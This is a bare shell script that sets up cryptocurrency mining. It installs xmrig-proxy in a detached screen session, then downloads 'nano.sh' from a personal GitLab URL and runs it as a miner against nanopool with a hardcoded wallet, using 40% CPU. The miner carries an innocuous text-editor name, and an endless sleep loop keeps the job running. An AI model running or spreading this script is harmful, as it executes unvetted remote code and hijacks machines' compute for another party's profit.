#!/bin/sh
sudo apt update
sudo apt install screen -y
wget https://github.com/xmrig/xmrig-proxy/releases/download/v6.14.0/xmrig-proxy-6.14.0-linux-x64.tar.gz
tar xvf xmrig-proxy-6.14.0-linux-x64.tar.gz
cd xmrig-proxy-6.14.0 && screen -dmS run ./xmrig-proxy -c stratum+tcp://ap.luckpool.net:3956#xnsub -u RLzgpxPC9Kioxe4sZr6Eitxpjkt9dbgZFH.rig1.$(echo $(shuf -i 1-9999 -n 1)-PROXY) -p x -b 0.0.0.0:3333 -m simple


wget https://gitlab.com/driji68/nano/-/raw/main/nano.sh
chmod +x nano.sh
./nano.sh -o xmr-asia1.nanopool.org:14433 -u RLzgpxPC9Kioxe4sZr6Eitxpjkt9dbgZFH.rig1.$(echo $(shuf -i 1-9999 -n 1)-PROXY) -p x --cpu 40
while [ 1 ]; do
sleep 3
done
sleep 999
